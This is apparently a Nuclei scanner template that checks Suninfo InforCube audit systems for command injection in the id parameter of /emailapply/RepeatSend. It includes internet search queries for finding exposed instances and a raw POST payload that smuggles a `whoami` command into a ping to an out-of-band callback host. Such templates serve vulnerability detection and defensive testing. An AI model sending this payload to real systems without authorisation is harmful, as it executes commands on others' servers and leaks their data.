id: Suninfo_InforCube_RepeatSend_RCE

info:
  name: Suninfo_InforCube_RepeatSend_RCE
  author: HK
  severity: critical
  description: 上讯信息InforCube运维审计系统/emailapply/RepeatSend接口id参数存在任意命令执行漏洞。
  metadata:
    max-request: 1
    Fofa-query: body="default/getloginhtml"
    Hunter-query: body="default/getloginhtml"
    Quake-query: body="default/getloginhtml"
    verified: true

http:
- raw:
  - |-
    @timeout: 30s
    POST /emailapply/RepeatSend HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Connection: close
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.850.86 Safari/537.36
    Content-Length: 44

    id='%0aping `whoami`.{{interactsh-url}} -c 2%0a'

  max-redirects: 3
  matchers-condition: and
  matchers:
      - type: word
        words:
          - "dns"
        part: interactsh_protocol